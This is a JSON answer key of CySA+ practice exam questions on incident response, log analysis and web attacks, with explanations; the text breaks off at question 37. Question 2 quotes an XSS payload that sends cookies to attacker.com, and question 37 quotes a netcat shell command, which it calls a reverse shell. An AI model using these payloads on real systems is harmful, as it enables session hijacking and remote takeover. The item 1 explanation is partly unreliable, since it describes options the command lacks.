{
  "category": "cysa",
  "testId": 8,
  "testName": "CySa Practice Test #8 (Very Challenging)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are analyzing a network intrusion and have identified a suspicious process on a compromised Linux server. You suspect the process may be communicating with a command-and-control (C2) server. Which of the following commands, and specific options, would provide the MOST comprehensive and efficient way to list *all* open network connections, including the associated process ID (PID), program name, connection state, and local and remote addresses, and then filter that output to show only connections involving a specific suspected C2 IP address (e.g., 198.51.100.25)?",
      "options": [
        "netstat -an | grep 198.51.100.25",
        "ss -tupn | grep 198.51.100.25",
        "lsof -i | grep 198.51.100.25",
        "tcpdump -i eth0 host 198.51.100.25"
      ],
      "correctAnswerIndex": 1,
      "explanation": "netstat -an is deprecated on many modern Linux systems and may not reliably show program names or all connection types. lsof -i is powerful for listing open files (including network sockets), but is less directly focused on providing a comprehensive, easily filtered view of *current* network connections with all relevant details. tcpdump is a packet capture tool; it's invaluable for deep packet inspection, but it doesn't provide a summarized view of established connections and associated processes. ss -tupn | grep 198.51.100.25 is the BEST option. ss is the modern replacement for netstat and provides more detailed and reliable information. The options provide: * -t: Show TCP sockets. * -u: Show UDP sockets. * -p: Show the process ID (PID) and program name associated with each socket. * -n: Show numerical addresses instead of resolving hostnames (faster and avoids potential DNS issues). * -l shows listening sockets. * -n shows numerical addresses instead of trying to resolve, which is much faster. Piping the output to grep 198.51.100.25 efficiently filters the results to show only connections involving the suspected C2 IP address.",
      "examTip": "ss -tupn is the preferred command on modern Linux systems for detailed network connection information; combine it with grep for efficient filtering."
    },
    {
      "id": 2,
      "question": "A web server's access logs show repeated requests similar to this: GET /search.php?term=<script>window.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1 What type of attack is being attempted, what is the attacker's likely goal, and which specific vulnerability in the web application makes this attack possible?",
      "options": [
        "SQL Injection; the attacker is trying to modify database queries; vulnerability is improper input validation in database queries.",
        "Cross-Site Scripting (XSS); the attacker is trying to steal user cookies and redirect them to a malicious site; vulnerability is insufficient output encoding.",
        "Cross-Site Request Forgery (CSRF); the attacker is trying to force users to perform actions they didn't intend; vulnerability is lack of anti-CSRF tokens.",
        "Denial-of-Service (DoS); the attacker is trying to overwhelm the server with requests; vulnerability is lack of rate limiting."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The injected code is JavaScript, not SQL. CSRF involves forcing actions, not injecting scripts. DoS aims to disrupt service, not steal data. This is a classic example of a reflected cross-site scripting (XSS) attack. The attacker is injecting a malicious JavaScript snippet into the term parameter of the search.php page. If the application doesn't properly sanitize or encode user input before displaying it back to the user (or other users), the injected script will be executed by the victim's browser. In this case, the script attempts to redirect the user to http://attacker.com/?c='+document.cookie, sending the user's cookies to the attacker's server. The attacker can then use these cookies to hijack the user's session. The core vulnerability is insufficient output encoding/escaping (and potentially insufficient input validation as well).",
      "examTip": "XSS attacks involve injecting malicious scripts into web pages; the core vulnerabilities are insufficient input validation and output encoding."
    },
    {
      "id": 3,
      "question": "An attacker sends an email to a user, impersonating a legitimate password reset service. The email contains a link to a fake website that mimics the real password reset page. The user clicks the link and enters their old and new passwords. What type of attack is this, and what is the MOST effective *technical* control to mitigate this specific threat?",
      "options": [
        "Cross-site scripting (XSS); input validation and output encoding.",
        "Phishing; multi-factor authentication (MFA) and security awareness training.",
        "SQL injection; parameterized queries and stored procedures.",
        "Brute-force attack; strong password policies and account lockouts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This is not XSS (which involves injecting scripts into a vulnerable website), SQL injection (which targets databases), or a brute-force attack (which involves guessing passwords). This is a classic phishing attack. The attacker is using social engineering (impersonating a trusted service) to trick the user into revealing their credentials. While security awareness training is crucial to educate users about phishing, the most effective technical control to mitigate this specific threat is multi-factor authentication (MFA). Even if the attacker obtains the user's password through the phishing site, they won't be able to access the account without the second authentication factor (e.g., a one-time code from a mobile app, a biometric scan, a security key).",
      "examTip": "MFA is a critical defense against phishing attacks that successfully steal passwords."
    },
    {
      "id": 4,
      "question": "You are analyzing a compromised web server and find the following entry in the Apache error log: [Fri Oct 27 14:35:02.123456 2024] [php:error] [pid 12345] [client 192.168.1.10:54321] PHP Fatal error: require_once(): Failed opening required '/var/www/html/includes/config.php' (include_path='.:/usr/share/php') in /var/www/html/index.php on line 3, referer: http://example.com/ What information can you reliably gather from this log entry, and what *cannot* be reliably determined solely from this entry?",
      "options": [
        "Reliably gather: The attacker's IP address. Cannot reliably determine: the type of attack.",
        "Reliably gather: The date and time of the error, the affected file and line number, and the referring page. Cannot reliably determine: the attacker's IP address.",
        "Reliably gather: The type of attack and the attacker's IP address. Cannot reliably determine: the vulnerability exploited.",
        "Reliably gather: The affected file and line number. Cannot reliably determine: whether an attack occurred."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This log entry is a PHP error message, not necessarily evidence of a successful attack. We can reliably gather: * Date and Time: [Fri Oct 27 14:35:02.123456 2024] * Error Type: PHP Fatal error: require_once(): Failed opening required ... * Affected File and Line: /var/www/html/index.php on line 3 * Referring Page: http://example.com/ (The page that linked to the one with the error) * Client IP: 192.168.1.10. Note that although an IP address is listed, this may not represent an attack. We cannot reliably determine solely from this entry: * The type of attack (if any). This could be a legitimate error caused by a misconfiguration or a missing file, not necessarily an attack. Further investigation (looking at access logs, other error logs) is needed. The error indicates a problem with including a required file (config.php). This could be related to an attack, but it could also be a simple coding or configuration error.",
      "examTip": "Error logs can provide clues, but don't always indicate an attack. Correlate with access logs and other information."
    },
    {
      "id": 5,
      "question": "A system administrator discovers a file named mimikatz.exe on a critical server. What is the MOST likely implication of this finding, and what immediate action should be taken?",
      "options": [
        "The file is likely a legitimate system administration tool; no action is needed.",
        "The file is likely a credential-dumping tool; the server is likely compromised, and immediate incident response procedures should be initiated.",
        "The file is likely a harmless text file; it can be safely deleted.",
        "The file is likely a corrupted system file; the server should be rebooted."
      ],
      "correctAnswerIndex": 1,
      "explanation": "mimikatz.exe is a well-known and extremely dangerous post-exploitation tool. It is not a legitimate system administration tool, a harmless text file, or a corrupted system file. Mimikatz is primarily used to extract plain text passwords, password hashes, Kerberos tickets, and other credentials from the memory of a Windows system. Finding mimikatz.exe on a server is a strong indicator of a serious compromise. The appropriate immediate action is to initiate the organization's incident response plan. This likely involves isolating the server from the network, preserving evidence (memory dumps, disk images), investigating the extent of the compromise, and remediating the issue (removing malware, patching vulnerabilities, resetting passwords, etc.).",
      "examTip": "The presence of mimikatz.exe (or similar credential-dumping tools) is a critical indicator of compromise."
    },
    {
      "id": 6,
      "question": "You are analyzing a PCAP file and observe a large number of TCP SYN packets sent to various ports on a target system, with no corresponding SYN-ACK responses from the target. What type of scan is MOST likely being performed, and what is its purpose?",
      "options": [
        "A full connect scan; to establish complete TCP connections with the target.",
        "A SYN scan (half-open scan); to identify open ports on the target while minimizing detection.",
        "An XMAS scan; to identify the operating system of the target.",
        "A NULL scan; to bypass firewall rules."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A full connect scan completes the three-way handshake (SYN, SYN-ACK, ACK). An XMAS scan and NULL scan use different TCP flag combinations. The described scenario – sending only SYN packets and not completing the handshake – is characteristic of a SYN scan (also known as a half-open scan or stealth scan). The attacker sends a SYN packet to each target port. If the port is open, the target will respond with a SYN-ACK packet. If the port is closed, the target will respond with an RST (reset) packet. The attacker doesn't send the final ACK packet to complete the connection. This makes the scan faster than a full connect scan and less likely to be logged by the target system. The purpose is to identify open ports on the target system, which can then be used to identify potential vulnerabilities.",
      "examTip": "SYN scans (half-open scans) are used for stealthy port scanning by not completing the TCP handshake."
    },
    {
      "id": 7,
      "question": "Which of the following is the MOST effective way to prevent 'cross-site request forgery (CSRF)' attacks?",
      "options": [
        "Using strong, unique passwords for all user accounts.",
        "Implementing anti-CSRF tokens and validating the Origin and Referer headers of HTTP requests.",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular security awareness training for developers and users."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords are important generally, but don't directly prevent CSRF. HTTPS protects data in transit, but not the forged request itself. Awareness training is helpful, but not a primary technical control. The most effective defense against CSRF is a combination of anti-CSRF tokens and validating the Origin and Referer headers. Anti-CSRF tokens are unique, secret, unpredictable tokens generated by the server for each session (or even each form). The server validates the token on submission to ensure the request originated from the legitimate application and not from an attacker's site. Checking the Origin and Referer headers helps confirm the request is coming from the expected domain.",
      "examTip": "Anti-CSRF tokens and Origin/Referer header validation are crucial for preventing CSRF attacks."
    },
    {
      "id": 8,
      "question": "You are investigating a suspected data breach. Which of the following actions should you perform FIRST, before any remediation or system changes?",
      "options": [
        "Immediately restore the affected systems from backups.",
        "Preserve evidence by creating forensic images of affected systems and collecting relevant logs.",
        "Notify law enforcement and regulatory agencies.",
        "Patch the vulnerability that led to the breach."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Restoring from backups before preserving evidence could overwrite crucial forensic data. Notifying authorities and patching are important, but not the first step. Before taking any action that might alter the state of the compromised systems, the absolute first priority is to preserve evidence. This involves creating forensic images (bit-for-bit copies) of the affected systems' storage devices, collecting relevant logs (system logs, application logs, network traffic captures), and documenting the chain of custody for all evidence. This ensures that the evidence is admissible in court and allows for a thorough investigation.",
      "examTip": "Preserve evidence (forensic images, logs) before making any changes to compromised systems."
    },
    {
      "id": 9,
      "question": "A security analyst is examining a Windows system and observes a process running with a command line that includes powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\script.ps1. What is the significance of the -ExecutionPolicy Bypass flag in this context?",
      "options": [
        "It encrypts the PowerShell script before execution.",
        "It allows the execution of unsigned PowerShell scripts, bypassing a security restriction.",
        "It forces the PowerShell script to run with administrator privileges.",
        "It prevents the PowerShell script from accessing the network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The -ExecutionPolicy Bypass flag does not encrypt the script, force administrator privileges, or prevent network access. The Windows PowerShell execution policy is a security feature that controls whether PowerShell can run scripts and load configuration files. The -ExecutionPolicy Bypass flag temporarily overrides the configured execution policy for that specific PowerShell instance, allowing unsigned scripts to be executed. Attackers often use this flag to run malicious PowerShell scripts that would otherwise be blocked by the system's security settings.",
      "examTip": "The -ExecutionPolicy Bypass flag in PowerShell allows unsigned scripts to run, bypassing a key security control."
    },
    {
      "id": 10,
      "question": "What is the primary purpose of using 'sandboxing' in malware analysis?",
      "options": [
        "To permanently delete suspected malware files from a system.",
        "To execute and analyze potentially malicious code in an isolated environment, without risking the host system or network.",
        "To encrypt sensitive data stored on a system to prevent unauthorized access.",
        "To back up critical system files and configurations to a secure, offsite location."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Sandboxing is not about deletion, encryption, or backups. A sandbox is a virtualized, isolated environment that is separate from the host operating system and network. It's used to safely execute and analyze potentially malicious files or code without risking harm to the production environment. The sandbox allows security analysts to observe malware behavior, identify indicators of compromise (IoCs), and determine potential impact, all without infecting the real system.",
      "examTip": "Sandboxing provides a safe, isolated environment for dynamic malware analysis."
    },
    {
      "id": 11,
      "question": "Which of the following Linux commands is MOST useful for viewing the end of a large log file in real-time, as new entries are appended?",
      "options": [
        "cat /var/log/syslog",
        "tail -f /var/log/syslog",
        "head /var/log/syslog",
        "grep error /var/log/syslog"
      ],
      "correctAnswerIndex": 1,
      "explanation": "cat displays the entire file content, which can be overwhelming for large, active logs. head shows the beginning of the file. grep searches for specific patterns, but doesn't show the end of the file or update in real-time. The tail command with the -f option (follow) makes tail continuously monitor the file and display new lines as they are appended. This is ideal for watching log files in real-time.",
      "examTip": "tail -f is the standard command for monitoring log files in real-time on Linux."
    },
    {
      "id": 12,
      "question": "What is the primary security benefit of implementing 'network segmentation'?",
      "options": [
        "It eliminates the need for firewalls and intrusion detection systems.",
        "It restricts the lateral movement of attackers within a network, limiting the impact of a security breach.",
        "It allows all users on the network to access all resources without any restrictions.",
        "It automatically encrypts all data transmitted across the network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Network segmentation complements firewalls and IDS; it doesn't replace them. It does not allow unrestricted access, nor does it automatically encrypt data. Network segmentation involves dividing a network into smaller, isolated subnetworks (segments or zones), often using VLANs or firewalls. This limits the lateral movement of attackers. If one segment is compromised, the attacker's access to other segments is restricted, containing the breach and reducing overall impact.",
      "examTip": "Network segmentation contains breaches and limits the attacker's ability to move laterally within the network."
    },
    {
      "id": 13,
      "question": "You are investigating a potential SQL injection vulnerability in a web application. Which of the following characters or sequences of characters in user input would be MOST concerning and require immediate attention?",
      "options": [
        "Angle brackets (< and >).",
        "Single quotes ('), double quotes (\"), semicolons (;), and SQL keywords (e.g., SELECT, INSERT, UPDATE, DELETE, UNION, DROP).",
        "Ampersands (&) and question marks (?).",
        "Periods (.) and commas (,)."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Angle brackets are primarily concerning for XSS. Ampersands and question marks are used in URLs, and periods/commas are not typically dangerous in SQL syntax. Single quotes, double quotes, semicolons, and SQL keywords are critical indicators of potential SQL injection. Attackers use these characters to break out of the intended SQL query and inject malicious code. Single quotes are used to terminate string literals, semicolons separate statements, and SQL keywords build malicious queries.",
      "examTip": "SQL injection often relies on manipulating single quotes, double quotes, semicolons, and SQL keywords."
    },
    {
      "id": 14,
      "question": "What is the primary purpose of 'fuzzing' in software security testing?",
      "options": [
        "To encrypt data transmitted between a client and a server.",
        "To provide invalid, unexpected, or random data as input to a program to identify vulnerabilities and potential crash conditions.",
        "To create strong, unique passwords for user accounts.",
        "To systematically review source code to identify security flaws and coding errors."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Fuzzing is not about encryption, password creation, or code review. Fuzz testing involves providing invalid, unexpected, malformed, or random data as input to a program, then monitoring it for crashes, errors, or exceptions. This helps discover bugs and vulnerabilities such as buffer overflows, input validation errors, and denial-of-service conditions.",
      "examTip": "Fuzzing finds vulnerabilities by feeding a program unexpected and invalid input."
    },
    {
      "id": 15,
      "question": "You are analyzing a suspicious email that claims to be from a well-known online service. Which of the following email headers would be MOST useful in determining the actual origin of the email, and why?",
      "options": [
        "From:",
        "Received:",
        "Subject:",
        "To:"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The From:, Subject:, and To: headers can be easily forged by attackers. The Received: headers provide a chronological record of the mail servers that handled the email as it was relayed. Each server adds its own Received: header to the top of the list, so by reviewing them from bottom to top, you can trace the path of the email. While not foolproof, it's the most reliable header for identifying the true origin.",
      "examTip": "Analyze the Received: headers (from bottom to top) to trace the path of an email and identify its origin."
    },
    {
      "id": 16,
      "question": "Which of the following techniques is MOST effective at mitigating the risk of 'DNS hijacking' or 'DNS spoofing' attacks?",
      "options": [
        "Using strong, unique passwords for all DNS server administrator accounts.",
        "Implementing DNSSEC (Domain Name System Security Extensions).",
        "Using a firewall to block all incoming UDP traffic on port 53.",
        "Conducting regular penetration testing exercises."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords protect DNS admin accounts but don't prevent spoofing. Blocking UDP port 53 would break DNS resolution. Penetration testing helps identify issues but doesn't directly prevent them. DNSSEC adds digital signatures to DNS records, ensuring authenticity and integrity of DNS data. This prevents attackers from forging DNS responses and redirecting users to malicious sites.",
      "examTip": "DNSSEC is the primary defense against DNS spoofing and hijacking."
    },
    {
      "id": 17,
      "question": "What is the primary purpose of using 'canary values' (also known as 'stack canaries') in memory protection?",
      "options": [
        "To encrypt sensitive data stored in a program's memory.",
        "To detect and prevent buffer overflow attacks by placing known values in memory and checking for their modification before function returns.",
        "To automatically allocate and deallocate memory for a program's variables and data structures.",
        "To improve the performance of memory access operations by caching frequently used data."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Stack canaries are not about encryption, memory management, or performance. They are a security technique to detect buffer overflows. A canary value is placed on the stack before the return address. If a buffer overflow overwrites the stack, it likely overwrites the canary. The system checks if the canary is intact before returning; if it's modified, the program terminates, preventing exploitation.",
      "examTip": "Stack canaries detect buffer overflows by checking for modifications to a known value placed on the stack."
    },
    {
      "id": 18,
      "question": "A security analyst is reviewing the configuration of a web server. They discover that the server is configured to allow the HTTP TRACE method. Why is this a potential security risk?",
      "options": [
        "The TRACE method is required for proper web server operation and is not a security risk.",
        "The TRACE method can potentially be used in cross-site tracing (XST) attacks to reveal sensitive information, such as cookies and authentication headers.",
        "The TRACE method is used to encrypt data transmitted between the client and the server.",
        "The TRACE method is used to automatically update the web server software."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The TRACE method is not required for normal operation and can be a risk. It doesn't encrypt data or update the server. Allowing HTTP TRACE can enable cross-site tracing (XST) attacks. An attacker can use TRACE to make the server echo back headers containing cookies, including HttpOnly cookies, or other sensitive information, which can then be stolen or used maliciously.",
      "examTip": "Disable the HTTP TRACE method on web servers to prevent cross-site tracing (XST) attacks."
    },
    {
      "id": 19,
      "question": "Which of the following is the MOST effective method for preventing 'cross-site scripting (XSS)' attacks?",
      "options": [
        "Using strong, unique passwords for all user accounts.",
        "Implementing rigorous input validation and context-aware output encoding (or escaping).",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular penetration testing exercises."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords and HTTPS are good overall but do not directly prevent XSS. Penetration testing helps identify vulnerabilities. The most effective defense is to combine thorough input validation with context-aware output encoding or escaping. Validate user input to ensure it doesn't contain malicious scripts, and properly encode characters like <, >, ', and \" so the browser interprets them as text rather than code.",
      "examTip": "Input validation and context-aware output encoding are crucial for XSS prevention."
    },
    {
      "id": 20,
      "question": "You are investigating a compromised Windows server and discover a suspicious executable file. What is the BEST first step to determine if this file is known malware?",
      "options": [
        "Execute the file on a production server to observe its behavior.",
        "Compare the file's hash (e.g., MD5, SHA256) against online malware databases like VirusTotal.",
        "Rename the file and move it to a different directory.",
        "Open the file in a text editor to examine its contents."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Executing it on a production server is extremely risky. Renaming or moving doesn't address the threat, and opening a binary in a text editor won't be that informative. Calculating a cryptographic hash (e.g., SHA256) and comparing it to a known-malware database (like VirusTotal) is the safest, fastest way to see if it matches known malicious files.",
      "examTip": "Checking a file's hash against online malware databases is a quick and safe way to identify known malware."
    },
    {
      "id": 21,
      "question": "A security analyst notices unusual activity on a workstation. The system is exhibiting slow performance, and there are multiple outbound connections to unfamiliar IP addresses. Which of the following tools would be MOST useful for quickly identifying the specific processes responsible for these network connections on a Windows system?",
      "options": [
        "Windows Firewall",
        "Resource Monitor",
        "Task Manager",
        "Performance Monitor"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Windows Firewall manages network access rules but doesn't show detailed process-level connections. Task Manager shows running processes, but not comprehensive network details. Performance Monitor tracks performance counters. Resource Monitor (resmon.exe) provides a detailed view of CPU, memory, disk, and network usage by process. On the Network tab, you can see which processes are making connections, along with the remote IP addresses, ports, and throughput, making it ideal for quick triage.",
      "examTip": "Use Resource Monitor on Windows to identify processes and their network connections."
    },
    {
      "id": 22,
      "question": "Which of the following is a characteristic of a 'watering hole' attack?",
      "options": [
        "An attacker directly targets a specific individual within an organization with a phishing email.",
        "An attacker compromises a website or service that is frequently visited by a targeted group of users, and then infects those users' computers when they visit the site.",
        "An attacker floods a network or server with traffic to make it unavailable to legitimate users.",
        "An attacker intercepts communication between two parties to eavesdrop on or modify the data."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Spear phishing involves targeting individuals with tailored emails. Flooding a network is DoS. Intercepting communication is a man-in-the-middle attack. A watering hole attack compromises a popular website used by the target group, infecting visitors (often with drive-by downloads). The attackers wait for the victims to come to them, like predators at a watering hole.",
      "examTip": "Watering hole attacks target specific groups by compromising sites they frequently visit."
    },
    {
      "id": 23,
      "question": "You are investigating a security incident and need to determine the exact order in which events occurred across multiple systems. What is the MOST critical requirement for accurate event correlation and timeline reconstruction?",
      "options": [
        "Having access to the source code of all applications running on the systems.",
        "Ensuring accurate and synchronized time across all systems and devices, using a protocol like NTP.",
        "Having a complete list of all user accounts and their associated permissions.",
        "Encrypting all log files to protect their confidentiality."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Access to source code, user account lists, and log encryption do not directly address event timing. Accurate and synchronized clocks using NTP is essential for reconstructing a timeline when correlating logs from multiple systems. Even small discrepancies in system clocks can make it impossible to tell which event happened first.",
      "examTip": "Accurate time synchronization (via NTP) is crucial for log correlation and incident analysis."
    },
    {
      "id": 24,
      "question": "What is the primary security purpose of using 'Content Security Policy (CSP)' in web applications?",
      "options": [
        "To encrypt data transmitted between the web server and the client's browser.",
        "To control the resources (scripts, stylesheets, images, etc.) that a browser is allowed to load, mitigating XSS and other code injection attacks.",
        "To automatically generate strong, unique passwords for user accounts.",
        "To prevent attackers from accessing files outside the webroot directory."
      ],
      "correctAnswerIndex": 1,
      "explanation": "CSP is not about encryption, password generation, or directory traversal. Content Security Policy is a security standard that helps mitigate cross-site scripting and other code injection attacks by defining approved sources for content. Browsers enforce these policies, blocking scripts, styles, or frames loaded from untrusted origins.",
      "examTip": "Content Security Policy (CSP) is a powerful browser-based mechanism to mitigate XSS and other code injection attacks."
    },
    {
      "id": 25,
      "question": "A security analyst is examining a compromised Linux system. They suspect that a malicious process might be masquerading as a legitimate system process. Which of the following commands, and associated options, would be MOST effective for listing all running processes, including their full command lines, and allowing the analyst to search for suspicious patterns?",
      "options": [
        "top",
        "ps aux",
        "ps aux | grep <suspicious_pattern>",
        "pstree"
      ],
      "correctAnswerIndex": 2,
      "explanation": "top is real-time but less useful for searching. pstree shows process hierarchy but not full command lines. ps aux shows current processes in detail, including full command lines. Using grep with ps aux (ps aux | grep <suspicious_pattern>) is the best approach for pinpointing suspicious processes by name or arguments.",
      "examTip": "ps aux (or ps -ef) provides a detailed snapshot of running processes; use grep to filter the results."
    },
    {
      "id": 26,
      "question": "Which of the following is a characteristic of 'spear phishing' attacks?",
      "options": [
        "They are sent to a large, undifferentiated group of recipients.",
        "They are highly targeted at specific individuals or organizations, often using personalized information to increase their success rate.",
        "They always involve exploiting a software vulnerability.",
        "They are primarily used to disrupt network services rather than steal information."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Generic phishing is sent to large groups. Spear phishing is highly targeted. It doesn't always involve a software exploit, and it's often meant to steal information or compromise accounts. Attackers use personal or organizational details to craft convincing emails or messages.",
      "examTip": "Spear phishing is a targeted attack that uses personalized information to increase its success rate."
    },
    {
      "id": 27,
      "question": "What is the purpose of 'data minimization' in the context of data privacy and security?",
      "options": [
        "Encrypting all data collected and stored by an organization.",
        "Collecting and retaining only the minimum necessary data required for a specific, legitimate purpose.",
        "Backing up all data to multiple locations to ensure its availability.",
        "Deleting all data after a certain period, regardless of its importance."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Data minimization is not solely about encryption, backup, or indiscriminate deletion. It is about collecting, processing, and retaining only the data that is necessary for a specific purpose, thereby reducing exposure in the event of a breach and helping with regulatory compliance.",
      "examTip": "Data minimization: Collect and keep only what you need, for as long as you need it."
    },
    {
      "id": 28,
      "question": "You are investigating a Windows system and suspect that a malicious process might be hiding its network connections. Which of the following tools or techniques would be MOST effective for uncovering hidden network connections?",
      "options": [
        "Task Manager",
        "Resource Monitor",
        "Netstat",
        "A kernel-mode rootkit detector or a memory forensics toolkit."
      ],
      "correctAnswerIndex": 3,
      "explanation": "Standard tools like Task Manager, Resource Monitor, and netstat rely on the OS's APIs, which can be subverted by a kernel-mode rootkit. A specialized kernel-mode rootkit detector or memory forensics toolkit (e.g., Volatility) can analyze system memory independently of potentially compromised APIs, revealing hidden processes and connections.",
      "examTip": "Rootkits can hide network connections from standard tools; use kernel-mode detectors or memory forensics for detection."
    },
    {
      "id": 29,
      "question": "A security analyst is reviewing logs and notices the following entry repeated multiple times within a short period: [timestamp] Authentication failure for user 'admin' from IP: 198.51.100.42 [timestamp] Authentication failure for user 'administrator' from IP: 198.51.100.42 [timestamp] Authentication failure for user 'root' from IP: 198.51.100.42 What type of attack is MOST likely indicated, and what *specific* actions should be taken to mitigate the *immediate* threat?",
      "options": [
        "A denial-of-service (DoS) attack; no immediate action is needed, as the attempts are failing.",
        "A brute-force or dictionary attack; temporarily block the IP address (198.51.100.42), review account lockout policies, and investigate the targeted accounts.",
        "A cross-site scripting (XSS) attack; review web application code for vulnerabilities.",
        "A SQL injection attack; review database query logs and implement parameterized queries."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Multiple failed login attempts for common administrative usernames from a single IP address strongly indicate a brute-force or dictionary attack. This is not a DoS, XSS, or SQL injection scenario. Immediate actions: block the offending IP (at least temporarily), review and potentially strengthen account lockout policies, investigate targeted accounts for any successful or suspicious logins.",
      "examTip": "Multiple failed login attempts for admin-level usernames from one IP often signal a brute-force attack."
    },
    {
      "id": 30,
      "question": "Which of the following statements BEST describes the concept of 'security through obscurity'?",
      "options": [
        "Implementing strong encryption algorithms to protect sensitive data.",
        "Relying on the secrecy of design or implementation as the main method of security, rather than on robust, well-known security mechanisms.",
        "Conducting regular security audits and penetration testing exercises.",
        "Using multi-factor authentication (MFA) to protect user accounts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Encryption, audits, and MFA are all legitimate security controls. Security through obscurity means depending mainly on hidden or proprietary designs or code for security, rather than proven, publicly vetted methods. Once the hidden details are discovered, the security collapses.",
      "examTip": "Security through obscurity is generally considered a weak and unreliable security practice."
    },
    {
      "id": 31,
      "question": "A company experiences a security incident where an attacker gains unauthorized access to a database server and steals sensitive customer data. What is the MOST important FIRST step the company should take after detecting and containing the incident?",
      "options": [
        "Immediately notify all affected customers about the data breach.",
        "Preserve all relevant evidence, including system logs, memory dumps, and disk images, following proper chain-of-custody procedures.",
        "Restore the database server from the most recent backup.",
        "Conduct a root cause analysis to determine how the attacker gained access."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Customer notification is crucial but not the first step. Restoring from a backup or performing root cause analysis before preserving evidence might overwrite critical forensic data. The absolute first priority after containment is to preserve evidence, including forensic images of affected systems, relevant logs, and chain-of-custody documentation.",
      "examTip": "Preserve evidence (forensic images, logs) before making any changes to compromised systems."
    },
    {
      "id": 32,
      "question": "Which of the following is the primary purpose of 'vulnerability scanning'?",
      "options": [
        "To exploit identified vulnerabilities and gain unauthorized access to systems.",
        "To identify, classify, prioritize, and report on security weaknesses in systems, networks, and applications.",
        "To automatically fix all identified vulnerabilities and misconfigurations.",
        "To simulate real-world attacks against an organization's defenses."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Vulnerability scanning is not about exploiting vulnerabilities (that's penetration testing), automatically fixing issues, or simulating attacks. Scanning involves using automated tools to identify potential weaknesses and misconfigurations and then prioritizing them for remediation.",
      "examTip": "Vulnerability scanning identifies and prioritizes potential security weaknesses, but doesn't exploit them."
    },
    {
      "id": 33,
      "question": "A web application allows users to upload files. An attacker uploads a file named evil.php containing malicious PHP code. If the web server is misconfigured, what is the attacker MOST likely attempting to achieve?",
      "options": [
        "To gain access to the user's computer.",
        "To execute arbitrary commands on the web server.",
        "To steal cookies from other users of the website.",
        "To deface the website by changing its appearance."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Uploading a malicious PHP file to a web server is typically aimed at achieving remote code execution on that server. Once executed, the PHP code might allow the attacker to run arbitrary commands, potentially leading to a full server compromise. Defacements or cookie theft might be side goals, but the immediate threat is code execution.",
      "examTip": "File upload vulnerabilities can allow attackers to upload and execute web shells, gaining control of the server."
    },
    {
      "id": 34,
      "question": "What is the key difference between 'authentication' and 'authorization' in access control?",
      "options": [
        "Authentication determines what a user is allowed to do, while authorization verifies the user's identity.",
        "Authentication verifies a user's identity, while authorization determines what resources and actions that user is permitted to access and perform.",
        "Authentication is only used for remote access, while authorization is used for local access.",
        "There is no significant difference; they are interchangeable terms."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Authentication answers “Who are you?” Authorization answers “What are you allowed to do?” They are not interchangeable or limited by location. Authentication involves verifying identity (e.g., via passwords, MFA), while authorization involves granting or denying access to specific resources or actions based on that identity.",
      "examTip": "Authentication: Who are you? Authorization: What are you allowed to do?"
    },
    {
      "id": 35,
      "question": "What is the primary goal of a 'phishing' attack?",
      "options": [
        "To overwhelm a server or network with traffic, making it unavailable to legitimate users.",
        "To trick individuals into revealing sensitive information or performing actions that compromise their security.",
        "To inject malicious scripts into a trusted website to be executed by other users' browsers.",
        "To exploit a software vulnerability to gain unauthorized access to a system."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A phishing attack is social engineering aimed at tricking users into revealing credentials or other information, or performing actions (e.g., clicking malicious links). Overwhelming a server is DoS, injecting scripts is XSS, and exploiting vulnerabilities is different from phishing.",
      "examTip": "Phishing attacks rely on deception and social engineering to trick users."
    },
    {
      "id": 36,
      "question": "Which of the following is the MOST effective method for preventing 'cross-site scripting (XSS)' attacks?",
      "options": [
        "Using strong, unique passwords for all user accounts and enabling multi-factor authentication (MFA).",
        "Implementing rigorous input validation and context-aware output encoding (or escaping).",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular penetration testing exercises and vulnerability scans."
      ],
      "correctAnswerIndex": 1,
      "explanation": "While strong passwords, MFA, HTTPS, and pentesting are valuable, they do not directly stop XSS. The best defense is a combination of strict input validation and context-aware output encoding/escaping for any user-supplied content.",
      "examTip": "Input validation and context-aware output encoding are crucial for XSS prevention."
    },
    {
      "id": 37,
      "question": "A security analyst observes the following command executed on a compromised Linux system: nc -nvlp 4444 -e /bin/bash What is this command MOST likely doing, and why is it a significant security concern?",
      "options": [
        "It is creating a secure shell (SSH) connection to a remote server for legitimate administrative purposes.",
        "It is setting up a reverse shell, allowing an attacker to remotely control the compromised system.",
        "It is displaying the contents of the /bin/bash file on the console.",
        "It is creating a backup copy of the /bin/bash file."
      ],
      "correctAnswerIndex": 1,
